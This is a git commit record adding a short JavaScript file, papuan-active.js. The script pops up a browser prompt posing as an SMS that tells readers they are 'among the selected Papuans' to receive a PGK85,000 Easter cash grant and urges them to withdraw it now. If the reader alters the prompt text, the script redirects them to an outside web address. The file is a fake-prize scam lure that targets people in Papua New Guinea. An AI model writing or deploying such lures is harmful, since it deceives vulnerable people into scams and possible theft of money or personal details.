fbb9eb76273d84c3aeed7e8c4bfb621afff6440c
bigukpe <bigaka42@gmail.com>
2025-04-16 22:36:05 +0100

    Create papuan-active.js

---
+++ papuan-active.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW PGK85,000'
+password=prompt('SMS: Congratulations, you are among the selected Papuans to receive PGK85,000 as Easter Celebration cash grant, Press Ok to withdraw cash Now ','WITHDRAW PGK85,000');
+if (password != 'WITHDRAW PGK85,000') {
+location.href='https://learnlivetech.org/papuan-easter';
+}
